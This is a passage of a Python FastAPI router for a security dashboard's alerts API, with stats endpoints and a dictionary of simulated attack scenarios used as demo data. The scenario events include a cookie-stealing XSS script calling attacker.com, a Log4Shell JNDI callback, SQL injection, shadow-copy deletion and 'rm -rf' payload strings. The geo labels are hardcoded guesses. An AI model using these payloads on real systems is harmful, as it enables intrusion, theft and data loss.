import ipaddress
import json
from datetime import datetime, timezone
from typing import Any, Optional
from uuid import UUID

# pyrefly: ignore [missing-import]
import psycopg
from fastapi import APIRouter, Depends, HTTPException, Query, Request, status
from pydantic import BaseModel, Field
# pyrefly: ignore [missing-import]
from psycopg.types.json import Jsonb

from ..core.database import get_sync_connection
from ..core.security import get_current_user, require_role, write_audit_log
from ..core.metrics import alerts_ingested_total, open_alerts_gauge
from ..services.kafka import publish_alert
from ..services.redis_pubsub import publish_live_alert, publish_ips_action, publish_live_incident
from ..services.ai_engine import ai_engine

router = APIRouter(prefix="/alerts", tags=["alerts"])


class AlertCreate(BaseModel):
    sensor_id: Optional[UUID] = None
    incident_id: Optional[UUID] = None
    src_ip: Optional[str] = None
    src_port: Optional[int] = Field(default=None, ge=1, le=65535)
    dst_ip: Optional[str] = None
    dst_port: Optional[int] = Field(default=None, ge=1, le=65535)
    protocol: Optional[str] = Field(default=None, max_length=50)
    signature: str = Field(..., min_length=1, max_length=500)
    category: str = Field(default="unknown", max_length=100)
    severity: str = Field(default="MEDIUM", max_length=20)
    risk_score: int = Field(default=0, ge=0, le=100)
    status: str = Field(default="OPEN", max_length=30)
    raw_event: Optional[dict[str, Any]] = None


class AlertStatusUpdate(BaseModel):
    status: str = Field(..., pattern="^(OPEN|INVESTIGATING|RESOLVED|FALSE_POSITIVE|AUTO_BLOCKED)$")


ALLOWED_SEVERITIES = {"LOW", "MEDIUM", "HIGH", "CRITICAL"}
ALLOWED_STATUSES = {"OPEN", "INVESTIGATING", "RESOLVED", "FALSE_POSITIVE", "AUTO_BLOCKED"}

_SELECT_COLS = """
    id, sensor_id, incident_id, rule_id,
    timestamp, src_ip::text AS src_ip, src_port,
    dst_ip::text AS dst_ip, dst_port, protocol,
    signature, category, severity, risk_score, status,
    raw_event, created_at
"""


@router.get("")
def list_alerts(
    severity: Optional[str] = Query(None),
    alert_status: Optional[str] = Query(None, alias="status"),
    src_ip: Optional[str] = Query(None),
    days: Optional[int] = Query(None, ge=1, le=365),
    skip: int = Query(0, ge=0),
    limit: int = Query(100, ge=1, le=1000),
    current_user: dict = Depends(get_current_user),
):
    """Return alerts with optional filtering, time window (days), and pagination."""
    conditions = []
    params: list[Any] = []

    if severity:
        conditions.append("severity = %s")
        params.append(severity.upper())
    if alert_status:
        conditions.append("status = %s")
        params.append(alert_status.upper())
    if src_ip:
        conditions.append("src_ip::text = %s")
        params.append(src_ip)
    if days is not None:
        conditions.append("timestamp >= now() - interval '1 day' * %s")
        params.append(days)

    where_clause = ("WHERE " + " AND ".join(conditions)) if conditions else ""
    params += [limit, skip]

    with get_sync_connection() as conn:
        with conn.cursor() as cur:
            cur.execute(
                f"""
                SELECT {_SELECT_COLS}
                FROM alerts
                {where_clause}
                ORDER BY timestamp DESC
                LIMIT %s OFFSET %s
                """,
                params,
            )
            items = cur.fetchall()

            cur.execute(f"SELECT COUNT(*) AS cnt FROM alerts {where_clause}", params[:-2])
            total = cur.fetchone()["cnt"]

    return {"items": items, "total": total, "skip": skip, "limit": limit}


@router.get("/stats/summary")
def alerts_summary(
    days: Optional[int] = Query(None, ge=1, le=365),
    current_user: dict = Depends(get_current_user),
):
    """Quick stats for the dashboard KPIs with optional historic days window."""
    time_filter = ""
    params: list[Any] = []
    if days is not None:
        time_filter = "WHERE timestamp >= now() - interval '1 day' * %s"
        params.append(days)

    with get_sync_connection() as conn:
        with conn.cursor() as cur:
            cur.execute(
                f"""
                SELECT
                    COUNT(*) FILTER (WHERE status = 'OPEN')           AS open_total,
                    COUNT(*) FILTER (WHERE severity = 'CRITICAL')     AS critical_total,
                    COUNT(*) FILTER (WHERE severity = 'HIGH')         AS high_total,
                    COUNT(*) FILTER (WHERE severity = 'MEDIUM')       AS medium_total,
                    COUNT(*) FILTER (WHERE severity = 'LOW')          AS low_total,
                    COUNT(*) FILTER (WHERE timestamp > now() - interval '1 hour') AS last_hour,
                    COUNT(*) FILTER (WHERE timestamp > now() - interval '24 hours') AS last_24h,
                    COUNT(*)                                          AS total_alerts,
                    COUNT(*) FILTER (WHERE category = 'web_api')      AS cat_web,
                    COUNT(*) FILTER (WHERE category = 'network')      AS cat_network,
                    COUNT(*) FILTER (WHERE category = 'exploitation') AS cat_exploit,
                    COUNT(*) FILTER (WHERE category = 'malware')      AS cat_malware,
                    COUNT(*) FILTER (WHERE category = 'credential')   AS cat_credential,
                    COUNT(*) FILTER (WHERE category = 'post_compromise') AS cat_post_comp
                FROM alerts
                {time_filter}
                """,
                params,
            )
            return cur.fetchone()


@router.get("/stats/timeline")
def alerts_timeline(
    days: int = Query(45, ge=1, le=365),
    current_user: dict = Depends(get_current_user),
):
    """Return aggregated time-series buckets from real database records (hourly for 1 day, daily for multiple days)."""
    with get_sync_connection() as conn:
        with conn.cursor() as cur:
            if days == 1:
                cur.execute(
                    """
                    WITH time_series AS (
                        SELECT generate_series(
                            date_trunc('hour', now() - interval '22 hours'),
                            date_trunc('hour', now()),
                            interval '2 hours'
                        ) AS bucket
                    ),
                    bucket_counts AS (
                        SELECT
                            date_trunc('hour', to_timestamp(floor(extract(epoch from timestamp) / 7200) * 7200)) AS bucket,
                            COUNT(*) AS total_threats,
                            COUNT(*) FILTER (WHERE status IN ('AUTO_BLOCKED', 'RESOLVED', 'CONTAINED')) AS auto_mitigated,
                            COUNT(*) FILTER (WHERE severity = 'CRITICAL' OR risk_score >= 90) AS zero_day_anomalies
                        FROM alerts
                        WHERE timestamp >= now() - interval '24 hours'
                        GROUP BY 1
                    )
                    SELECT
                        to_char(ts.bucket, 'HH24:MI') AS time,
                        ts.bucket::text AS full_date,
                        COALESCE(bc.total_threats, 0)::int AS "totalThreats",
                        COALESCE(bc.auto_mitigated, 0)::int AS "autoMitigated",
                        COALESCE(bc.zero_day_anomalies, 0)::int AS "zeroDayAnomalies"
                    FROM time_series ts
                    LEFT JOIN bucket_counts bc ON ts.bucket = bc.bucket
                    ORDER BY ts.bucket ASC
                    """
                )
            else:
                cur.execute(
                    """
                    WITH date_series AS (
                        SELECT generate_series(
                            date_trunc('day', now() - (interval '1 day' * (%s - 1))),
                            date_trunc('day', now()),
                            interval '1 day'
                        )::date AS day
                    ),
                    daily_counts AS (
                        SELECT
                            date_trunc('day', timestamp)::date AS day,
                            COUNT(*) AS total_threats,
                            COUNT(*) FILTER (WHERE status IN ('AUTO_BLOCKED', 'RESOLVED', 'CONTAINED')) AS auto_mitigated,
                            COUNT(*) FILTER (WHERE severity = 'CRITICAL' OR risk_score >= 90) AS zero_day_anomalies
                        FROM alerts
                        WHERE timestamp >= date_trunc('day', now() - (interval '1 day' * (%s - 1)))
                        GROUP BY 1
                    )
                    SELECT
                        to_char(ds.day, 'Mon DD') AS time,
                        ds.day::text AS full_date,
                        COALESCE(dc.total_threats, 0)::int AS "totalThreats",
                        COALESCE(dc.auto_mitigated, 0)::int AS "autoMitigated",
                        COALESCE(dc.zero_day_anomalies, 0)::int AS "zeroDayAnomalies"
                    FROM date_series ds
                    LEFT JOIN daily_counts dc ON ds.day = dc.day
                    ORDER BY ds.day ASC
                    """,
                    (days, days),
                )
            items = cur.fetchall()
    return {"items": items, "days": days}


@router.get("/stats/kill-chain")
def alerts_kill_chain(
    days: Optional[int] = Query(None, ge=1, le=365),
    current_user: dict = Depends(get_current_user),
):
    """Return real MITRE Cyber Kill Chain stage counts derived from active alerts in database."""
    time_filter = ""
    params: list[Any] = []
    if days is not None:
        time_filter = "WHERE timestamp >= now() - interval '1 day' * %s"
        params.append(days)

    with get_sync_connection() as conn:
        with conn.cursor() as cur:
            cur.execute(
                f"""
                SELECT
                    COUNT(*) FILTER (WHERE category = 'network' OR signature ~* '(scan|probe|syn|flood|sweep|recon)') AS recon_count,
                    COUNT(*) FILTER (WHERE category IN ('exploitation', 'web_api') OR signature ~* '(cve|sqli|rce|log4j|exploit|inject|shell)') AS exploit_count,
                    COUNT(*) FILTER (WHERE category = 'credential' OR signature ~* '(kerberos|psexec|brute|ticket|relay|ntlm|auth)') AS lateral_count,
                    COUNT(*) FILTER (WHERE category = 'malware' OR signature ~* '(trojan|beacon|c2|rat|rootkit|cobalt|virus|worm|malware)') AS c2_count,
                    COUNT(*) FILTER (WHERE category = 'post_compromise' OR signature ~* '(exfil|tunnel|shadow|vault|theft|dns)') AS exfil_count,
                    COUNT(*) FILTER (WHERE status = 'AUTO_BLOCKED') AS quarantine_count
                FROM alerts
                {time_filter}
                """,
                params,
            )
            row = cur.fetchone() or {}

            cur.execute("SELECT COUNT(*) AS total_blocked FROM blocked_ips WHERE is_active = true")
            blocked_res = cur.fetchone() or {}
            active_quarantines = (row.get("quarantine_count") or 0) + (blocked_res.get("total_blocked") or 0)

    stages = [
        {
            "name": "1. Reconnaissance",
            "count": int(row.get("recon_count") or 0),
            "severity": "LOW",
            "color": "#10b981",
            "status": "Monitored" if (row.get("recon_count") or 0) > 0 else "Clear",
            "desc": "Port scans & service probes",
        },
        {
            "name": "2. Exploitation",
            "count": int(row.get("exploit_count") or 0),
            "severity": "MEDIUM",
            "color": "#f59e0b",
            "status": "Mitigated" if (row.get("exploit_count") or 0) > 0 else "Clear",
            "desc": "RCE & web application attacks",
        },
        {
            "name": "3. Lateral Pivot",
            "count": int(row.get("lateral_count") or 0),
            "severity": "HIGH",
            "color": "#f97316",
            "status": "Intercepted" if (row.get("lateral_count") or 0) > 0 else "Clear",
            "desc": "Credential theft & SMB relay",
        },
        {
            "name": "4. C2 Beaconing",
            "count": int(row.get("c2_count") or 0),
            "severity": "HIGH",
            "color": "#a855f7",
            "status": "Terminated" if (row.get("c2_count") or 0) > 0 else "Clear",
            "desc": "Cobalt Strike & trojan beacons",
        },
        {
            "name": "5. Exfiltration",
            "count": int(row.get("exfil_count") or 0),
            "severity": "CRITICAL",
            "color": "#ef4444",
            "status": "Blocked" if (row.get("exfil_count") or 0) > 0 else "Clear",
            "desc": "Outbound tunnels & data exfiltration",
        },
        {
            "name": "6. Auto-Quarantine",
            "count": int(active_quarantines),
            "severity": "LOW",
            "color": "#00d4ff",
            "status": "Enforced" if active_quarantines > 0 else "Standby",
            "desc": "Autonomous firewall drops applied",
        },
    ]
    return {"stages": stages}


@router.get("/stats/geo-radar")
def alerts_geo_radar(
    days: Optional[int] = Query(None, ge=1, le=365),
    current_user: dict = Depends(get_current_user),
):
    """Return real active adversary origins and target assets from database alerts."""
    time_filter = ""
    params: list[Any] = []
    if days is not None:
        time_filter = "WHERE timestamp >= now() - interval '1 day' * %s"
        params.append(days)

    with get_sync_connection() as conn:
        with conn.cursor() as cur:
            cur.execute(
                f"""
                SELECT
                    src_ip::text AS ip,
                    COUNT(*) AS hits,
                    MAX(severity) AS sev,
                    MAX(category) AS category,
                    MAX(signature) AS signature,
                    MAX(timestamp) AS last_seen
                FROM alerts
                {time_filter}
                GROUP BY src_ip
                ORDER BY hits DESC
                LIMIT 6
                """,
                params,
            )
            attacker_rows = cur.fetchall() or []

            cur.execute(
                f"""
                SELECT
                    dst_ip::text AS ip,
                    COUNT(*) AS hits,
                    MAX(risk_score) AS max_risk,
                    MAX(severity) AS sev
                FROM alerts
                {time_filter}
                GROUP BY dst_ip
                ORDER BY hits DESC
                LIMIT 5
                """,
                params,
            )
            target_rows = cur.fetchall() or []

            cur.execute("SELECT ip_address::text AS ip, hostname, name, status, metadata FROM sensors")
            sensor_rows = cur.fetchall() or []

            cur.execute("SELECT ip_address::text AS ip FROM blocked_ips WHERE is_active = true")
            blocked_ips = {r["ip"].split("/")[0] for r in (cur.fetchall() or [])}

    GEO_MAP = [
        ("185.220.", "Eastern Europe / RU", "🇷🇺", "AS9009 Tor Exit Node"),
        ("45.33.", "East Asia / CN", "🇨🇳", "AS4134 Chinanet Backbone"),
        ("45.154.", "Eastern Europe / RO", "🇷🇴", "AS200019 Alexhost"),
        ("194.26.", "Western Europe / NL", "🇳🇱", "AS16276 OVH Cloud SAS"),
        ("198.51.100.", "North America / US", "🇺🇸", "AS14061 DigitalOcean LLC"),
        ("203.0.113.", "Asia-Pacific / SG", "🇸🇬", "AS45102 Alibaba Cloud"),
        ("77.247.", "Eastern Europe / UA", "🇺🇦", "AS49392 ITL LLC"),
        ("89.248.", "Western Europe / DE", "🇩🇪", "AS202425 Hetzner Online"),
        ("91.108.", "Middle East / UAE", "🇦🇪", "AS44907 Telegram FZ-LLC"),
        ("179.185.", "South America / BR", "🇧🇷", "AS28573 Claro S.A."),
        ("10.", "Internal Pivot / Lateral", "🏢", "RFC1918 Enterprise Subnet"),
    ]

    sensor_map = {s["ip"].split("/")[0]: s for s in sensor_rows if s.get("ip")}

    origins = []
    for idx, att in enumerate(attacker_rows):
        clean_ip = str(att["ip"]).split("/")[0]
        hits_num = att.get("hits", 1)
        sev = (att.get("sev") or "MEDIUM").upper()

        geo_info = ("Global WAN", "🌐", "AS-Transit Unknown")
        for prefix, ctry, flg, asn in GEO_MAP:
            if clean_ip.startswith(prefix):
                geo_info = (ctry, flg, asn)
                break

        angle = (idx * 60 + 35) % 360
        radius = 80 if sev == "CRITICAL" else (65 if sev == "HIGH" else 50)
        is_blocked = clean_ip in blocked_ips

        origins.append({
            "country": geo_info[0],
            "flag": geo_info[1],
            "ip": clean_ip,
            "asn": geo_info[2],
            "hits": f"{hits_num} events",
            "hits_num": hits_num,
            "sev": sev,
            "status": "BLOCKED" if is_blocked else "ATTACKING",
            "angle": angle,
            "radius": radius,
            "signature": att.get("signature", "Threat Vector"),
        })

    targets = []
    for t in target_rows:
        clean_ip = str(t["ip"]).split("/")[0]
        sensor = sensor_map.get(clean_ip)
        risk = int(t.get("max_risk") or 60)
        s_meta = sensor.get("metadata") or {} if sensor else {}
        is_isolated = s_meta.get("isolated", False)

        targets.append({
            "host": sensor.get("hostname") if sensor else f"host-{clean_ip.replace('.', '-')}",
            "ip": clean_ip,
            "role": sensor.get("name") if sensor else "Protected Enterprise Asset",
            "risk": risk,
            "status": "ISOLATED" if is_isolated else ("FILTERING" if risk > 80 else "SECURED"),
            "attack_count": t.get("hits", 1),
        })

    return {"origins": origins, "targets": targets}


class SimulateRequest(BaseModel):
    scenario: str = "LOG4J"


SIMULATED_SCENARIOS = {
    "LOCKBIT": {
        "name": "LockBit 3.0 Ransomware Volume Shadow Deletion",
        "src_ip": "198.51.100.22",
        "dst_ip": "10.240.20.88",
        "dst_port": 445,
        "protocol": "SMB",
        "signature": "Win32.Ransomware.LockBit3.0 Volume Shadow Deletion via vssadmin",
        "category": "malware",
        "severity": "CRITICAL",
        "risk_score": 99,
        "raw_event": {"command": "vssadmin.exe delete shadows /all /quiet", "target": "DC01"}
    },
    "SYN_FLOOD": {
        "name": "Mirai Botnet TCP SYN Flood Saturation DDoS",
        "src_ip": "194.26.29.112",
        "dst_ip": "10.240.0.1",
        "dst_port": 80,
        "protocol": "TCP",
        "signature": "Mirai IoT SYN Flood Distributed Denial of Service (> 1.2M pps)",
        "category": "network",
        "severity": "CRITICAL",
        "risk_score": 94,
        "raw_event": {"pps": 1200000, "flag": "SYN"}
    },
    "KERBEROAST": {
        "name": "Active Directory Kerberoasting Service Ticket Theft",
        "src_ip": "10.240.15.44",
        "dst_ip": "10.240.10.4",
        "dst_port": 88,
        "protocol": "Kerberos",
        "signature": "Kerberoasting Active Directory Ticket Request (RC4-HMAC downgrade)",
        "category": "credential",
        "severity": "HIGH",
        "risk_score": 94,
        "raw_event": {"spn": "MSSQLSvc/db-vault.prod:1433", "encryption": "rc4-hmac"}
    },
    "SQLI": {
        "name": "SQL Injection Database Schema Extraction",
        "src_ip": "198.51.100.99",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET WEB_SPECIFIC_APPS SQL Injection in URI parameter 'id=1 UNION SELECT * FROM users'",
        "category": "web_api",
        "severity": "CRITICAL",
        "risk_score": 98,
        "raw_event": {
            "uri": "/api/v1/customers?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
            "method": "GET",
            "user_agent": "sqlmap/1.7.2#stable"
        }
    },
    "LOG4J": {
        "name": "Apache Log4Shell JNDI Remote Code Execution",
        "src_ip": "185.220.101.5",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET EXPLOIT Apache Log4j JNDI RCE (CVE-2021-44228)",
        "category": "exploitation",
        "severity": "CRITICAL",
        "risk_score": 98,
        "raw_event": {"jndi_payload": "${jndi:ldap://185.220.101.5:1389/Exploit}", "cve": "CVE-2021-44228"}
    },
    "DATA_EXFIL": {
        "name": "DNS Tunneling Sensitive Database Exfiltration",
        "src_ip": "10.240.20.88",
        "dst_ip": "45.33.32.10",
        "dst_port": 53,
        "protocol": "DNS",
        "signature": "ET POST_COMPROMISE Data Exfiltration Over DNS Tunnel (Base64 Chunked)",
        "category": "post_compromise",
        "severity": "CRITICAL",
        "risk_score": 97,
        "raw_event": {"bytes_exfiltrated": 15400000, "tunnel_domain": "exfil.attacker-dns.org"}
    },
    "TROJAN": {
        "name": "Cobalt Strike Malleable C2 Trojan Beacon",
        "src_ip": "45.33.32.156",
        "dst_ip": "10.240.10.4",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET TROJAN Cobalt Strike Malleable C2 HTTPS Beacon",
        "category": "malware",
        "severity": "CRITICAL",
        "risk_score": 96,
        "raw_event": {"beacon_sleep": 30, "jitter": 15}
    },
    "DDOS": {
        "name": "Volumetric UDP / DNS Reflection DDoS Attack",
        "src_ip": "194.26.29.50",
        "dst_ip": "10.240.0.1",
        "dst_port": 53,
        "protocol": "UDP",
        "signature": "ET DDoS Volumetric UDP Reflection Flood (> 50 Gbps)",
        "category": "network",
        "severity": "CRITICAL",
        "risk_score": 95,
        "raw_event": {"gbps": 52.4, "pps": 48000000}
    },
    "BRUTE_FORCE": {
        "name": "SSH Administrative Credential Brute Force Attack",
        "src_ip": "198.51.100.42",
        "dst_ip": "10.240.10.4",
        "dst_port": 22,
        "protocol": "SSH",
        "signature": "ET POLICY SSH Brute Force Key Extraction (> 500 Failed Auth/min)",
        "category": "credential",
        "severity": "HIGH",
        "risk_score": 94,
        "raw_event": {"failed_attempts": 524, "tool": "hydra/v9.4"}
    },
    "XSS": {
        "name": "Stored Cross-Site Scripting Cookie Exfiltration",
        "src_ip": "198.51.100.88",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET WEB_SPECIFIC_APPS Cross-Site Scripting <script>document.cookie exfil",
        "category": "web_api",
        "severity": "HIGH",
        "risk_score": 88,
        "raw_event": {"script": "<script>fetch('http://attacker.com/c?c='+document.cookie)</script>"}
    },
    "RCE": {
        "name": "Spring4Shell Remote Code Execution Ingress Attempt",
        "src_ip": "185.220.101.99",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET EXPLOIT Spring4Shell Remote Code Execution (CVE-2022-22965)",
        "category": "exploitation",
        "severity": "CRITICAL",
        "risk_score": 99,
        "raw_event": {"class_loader_override": "class.module.classLoader.resources.context.parent.pipeline.first.pattern"}
    },
    "LATER_MOVEMENT": {
        "name": "PsExec Administrative Remote Command Execution",
        "src_ip": "10.240.15.44",
        "dst_ip": "10.240.10.4",
        "dst_port": 445,
        "protocol": "SMB",
        "signature": "ET POST_COMPROMISE PsExec Remote Service Creation Lateral Movement",
        "category": "post_compromise",
        "severity": "CRITICAL",
        "risk_score": 94,
        "raw_event": {"service_created": "PSEXESVC.exe", "command": "cmd.exe /c whoami"}
    },
    # ── MALWARE ───────────────────────────────────────────────────────────────
    "WORM": {
        "name": "WannaCry EternalBlue Network Worm Propagation",
        "src_ip": "185.220.101.99",
        "dst_ip": "10.240.15.50",
        "dst_port": 445,
        "protocol": "SMB",
        "signature": "ET EXPLOIT EternalBlue MS17-010 WannaCry Worm Propagation (CVE-2017-0144)",
        "category": "malware",
        "severity": "CRITICAL",
        "risk_score": 97,
        "raw_event": {"exploit": "MS17-010", "propagation_subnet": "10.240.15.0/24", "cve": "CVE-2017-0144"}
    },
    "RAT": {
        "name": "AsyncRAT Remote Access Trojan Command Control",
        "src_ip": "193.142.58.12",
        "dst_ip": "10.240.15.12",
        "dst_port": 6606,
        "protocol": "TCP",
        "signature": "ET TROJAN AsyncRAT SSL C2 Beacon (Client Registration Packet)",
        "category": "malware",
        "severity": "HIGH",
        "risk_score": 93,
        "raw_event": {"client_id": "FIN-PC09", "plugin": "Keylogger.dll", "screen_capture": True}
    },
    "ROOTKIT": {
        "name": "Linux Kernel ld.so.preload Library Rootkit",
        "src_ip": "10.240.10.45",
        "dst_ip": "10.240.10.1",
        "dst_port": 22,
        "protocol": "SSH",
        "signature": "ET TROJAN Linux Rootkit ld.so.preload Library Injection (Defense Evasion)",
        "category": "malware",
        "severity": "CRITICAL",
        "risk_score": 95,
        "raw_event": {"preload_path": "/etc/ld.so.preload", "library": "librootkit.so", "killed": "syslogd"}
    },
    "INFOSTEALER": {
        "name": "RedLine Infostealer Browser Credentials Extraction",
        "src_ip": "45.154.255.10",
        "dst_ip": "10.240.15.88",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET TROJAN RedLine Infostealer SQLite Credential Vault Exfiltration",
        "category": "malware",
        "severity": "HIGH",
        "risk_score": 94,
        "raw_event": {"exfil_db": "Chrome_Login_Data.db", "cookies": True, "crypto_wallets": True}
    },
    "VIRUS": {
        "name": "Polymorphic File-Infecting Virus Propagation",
        "src_ip": "10.240.15.33",
        "dst_ip": "10.240.15.0",
        "dst_port": 445,
        "protocol": "SMB",
        "signature": "ET MALWARE Win32.Virus.Polymorphic File Infector Network Spread",
        "category": "malware",
        "severity": "HIGH",
        "risk_score": 89,
        "raw_event": {"infected_files": 142, "mutation_engine": True, "spread_via": "SMB shares"}
    },
    "SPYWARE": {
        "name": "FinFisher Commercial Spyware Activity",
        "src_ip": "91.108.4.200",
        "dst_ip": "10.240.15.77",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET MALWARE FinFisher Spyware Encrypted C2 Beacon (Covert Surveillance)",
        "category": "malware",
        "severity": "HIGH",
        "risk_score": 91,
        "raw_event": {"c2_domain": "finfisher-c2.net", "audio_capture": True, "location_tracking": True}
    },
    "ADWARE": {
        "name": "Aggressive Adware Browser Hijack and Redirect",
        "src_ip": "203.0.113.55",
        "dst_ip": "10.240.15.44",
        "dst_port": 80,
        "protocol": "HTTP",
        "signature": "ET ADWARE Aggressive Browser Hijacker Redirect Chain Detected",
        "category": "malware",
        "severity": "LOW",
        "risk_score": 45,
        "raw_event": {"hijacked_homepage": True, "redirects": 8, "pua_name": "SearchDefault"}
    },
    "KEYLOGGER": {
        "name": "Hardware Keylogger Firmware Credential Harvesting",
        "src_ip": "10.240.15.99",
        "dst_ip": "45.33.32.200",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET MALWARE Keylogger Batch Upload Credential Harvest (Keystroke Buffer Flush)",
        "category": "malware",
        "severity": "CRITICAL",
        "risk_score": 96,
        "raw_event": {"keystrokes_captured": 48200, "passwords_extracted": 12, "exfil_size_kb": 34}
    },
    "BOTNET_MALWARE": {
        "name": "Mirai Botnet C2 Registration and Command Receipt",
        "src_ip": "193.142.58.80",
        "dst_ip": "10.240.15.100",
        "dst_port": 23,
        "protocol": "Telnet",
        "signature": "ET TROJAN Mirai Botnet C2 Registration and Command Channel Active",
        "category": "malware",
        "severity": "CRITICAL",
        "risk_score": 95,
        "raw_event": {"bot_id": "MR-3K9X", "c2_cmd": "ATTACK 10.240.0.1 80 60", "iot_device": "IP Camera"}
    },
    "BACKDOOR": {
        "name": "Persistent Bind Shell Backdoor on TCP 31337",
        "src_ip": "45.33.32.177",
        "dst_ip": "10.240.15.25",
        "dst_port": 31337,
        "protocol": "TCP",
        "signature": "ET MALWARE Bind Shell Backdoor Listen Port 31337 (Persistent Access)",
        "category": "malware",
        "severity": "CRITICAL",
        "risk_score": 97,
        "raw_event": {"listen_port": 31337, "shell": "/bin/bash", "persistence": "systemd unit"}
    },
    "LOGIC_BOMB": {
        "name": "Scheduled Logic Bomb Payload Detonation",
        "src_ip": "10.240.10.88",
        "dst_ip": "10.240.20.88",
        "dst_port": 0,
        "protocol": "LOCAL",
        "signature": "ET MALWARE Logic Bomb Trigger Condition Met -- Scheduled Destructive Payload",
        "category": "malware",
        "severity": "CRITICAL",
        "risk_score": 98,
        "raw_event": {"trigger": "date==2026-01-01", "payload": "rm -rf /var/lib/postgres/*", "time_to_trigger_ms": 0}
    },
    "FILELESS_MALWARE": {
        "name": "PowerShell Fileless Malware Memory Injection",
        "src_ip": "10.240.15.66",
        "dst_ip": "185.220.101.5",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET EXPLOIT Fileless PowerShell Reflective DLL Injection (In-Memory Execution)",
        "category": "malware",
        "severity": "CRITICAL",
        "risk_score": 96,
        "raw_event": {"method": "Reflective DLL Injection", "process": "powershell.exe", "disk_artifacts": False}
    },
    "BOOTKIT": {
        "name": "Bootkit MBR Infection Persistence Mechanism",
        "src_ip": "10.240.15.10",
        "dst_ip": "10.240.15.10",
        "dst_port": 0,
        "protocol": "LOCAL",
        "signature": "ET MALWARE Bootkit MBR Overwrite Detected (Pre-OS Persistence Stage)",
        "category": "malware",
        "severity": "CRITICAL",
        "risk_score": 97,
        "raw_event": {"mbr_written": True, "sector": 0, "bootkit_name": "Mebromi", "pre_os_hook": True}
    },
    "CRYPTOJACKING": {
        "name": "XMRig Cryptojacking Unauthorized Mining Activity",
        "src_ip": "10.240.15.55",
        "dst_ip": "45.33.32.99",
        "dst_port": 3333,
        "protocol": "TCP",
        "signature": "ET MALWARE XMRig Monero Cryptominer Pool Connection (Unauthorized Mining)",
        "category": "malware",
        "severity": "MEDIUM",
        "risk_score": 72,
        "raw_event": {"miner": "xmrig/6.20.0", "pool": "pool.xmr.org:3333", "hashrate_khs": 4200}
    },
    "WIPER_MALWARE": {
        "name": "HermeticWiper Destructive Disk Wipe Campaign",
        "src_ip": "195.88.54.10",
        "dst_ip": "10.240.20.88",
        "dst_port": 445,
        "protocol": "SMB",
        "signature": "ET MALWARE HermeticWiper Destructive Payload MBR/Partition Overwrite",
        "category": "malware",
        "severity": "CRITICAL",
        "risk_score": 100,
        "raw_event": {"driver": "EaseUS Partition Master signed", "target": "MBR+partitions", "recovery": "impossible"}
    },
    "LOADER_MALWARE": {
        "name": "IcedID Loader Secondary Payload Stage Drop",
        "src_ip": "185.220.101.44",
        "dst_ip": "10.240.15.33",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET TROJAN IcedID Loader Secondary Payload HTTP Download Stage",
        "category": "malware",
        "severity": "HIGH",
        "risk_score": 90,
        "raw_event": {"loader": "IcedID", "payload_url": "https://cdn-update.net/payload.bin", "stage": 2}
    },
    "BANKING_TROJAN": {
        "name": "TrickBot Banking Trojan Web Inject",
        "src_ip": "185.225.17.55",
        "dst_ip": "10.240.15.22",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET TROJAN TrickBot Banking Trojan Web Inject Financial Portal Hijack",
        "category": "malware",
        "severity": "CRITICAL",
        "risk_score": 96,
        "raw_event": {"target_bank": "bankofamerica.com", "inject_type": "form_grabber", "creds_stolen": True}
    },
    "MOBILE_MALWARE": {
        "name": "FluBot Android SMS Banking Malware Campaign",
        "src_ip": "91.108.56.180",
        "dst_ip": "10.240.15.55",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET TROJAN FluBot Android SMS Spyware C2 Registration (Mobile Device)",
        "category": "malware",
        "severity": "HIGH",
        "risk_score": 88,
        "raw_event": {"platform": "Android", "sms_contacts_stolen": 186, "banking_apps_targeted": ["HDFC", "ICICI"]}
    },
    # ── NETWORK ───────────────────────────────────────────────────────────────
    "DOS": {
        "name": "Resource Exhaustion Denial of Service Attack",
        "src_ip": "185.220.101.12",
        "dst_ip": "10.240.0.1",
        "dst_port": 80,
        "protocol": "TCP",
        "signature": "ET DOS Resource Exhaustion HTTP Slowloris Attack (Connection Starvation)",
        "category": "network",
        "severity": "HIGH",
        "risk_score": 85,
        "raw_event": {"connections": 10000, "technique": "Slowloris", "target_saturated": True}
    },
    "UDP_FLOOD": {
        "name": "UDP Packet Flood Traffic Saturation Attack",
        "src_ip": "194.26.29.88",
        "dst_ip": "10.240.0.1",
        "dst_port": 0,
        "protocol": "UDP",
        "signature": "ET DOS UDP Flood Random Port Saturation Attack (> 10 Gbps)",
        "category": "network",
        "severity": "CRITICAL",
        "risk_score": 92,
        "raw_event": {"gbps": 10.5, "pps": 14000000, "random_ports": True}
    },
    "ICMP_FLOOD": {
        "name": "ICMP Echo Request Ping Flood Attack",
        "src_ip": "203.0.113.44",
        "dst_ip": "10.240.0.1",
        "dst_port": 0,
        "protocol": "ICMP",
        "signature": "ET DOS ICMP Echo Request Flood Detected (Ping Flood > 100k pps)",
        "category": "network",
        "severity": "HIGH",
        "risk_score": 82,
        "raw_event": {"type": 8, "code": 0, "pps": 120000, "spoofed_src": True}
    },
    "PING_OF_DEATH": {
        "name": "Oversized ICMP Ping of Death Packet",
        "src_ip": "198.51.100.66",
        "dst_ip": "10.240.0.1",
        "dst_port": 0,
        "protocol": "ICMP",
        "signature": "ET DOS Ping of Death Oversized Fragmented ICMP Packet (> 65535 bytes)",
        "category": "network",
        "severity": "HIGH",
        "risk_score": 80,
        "raw_event": {"packet_size_bytes": 65600, "fragmented": True, "target_crash_risk": "HIGH"}
    },
    "SMURF_ATTACK": {
        "name": "ICMP Amplification Smurf Broadcast Attack",
        "src_ip": "203.0.113.77",
        "dst_ip": "10.240.255.255",
        "dst_port": 0,
        "protocol": "ICMP",
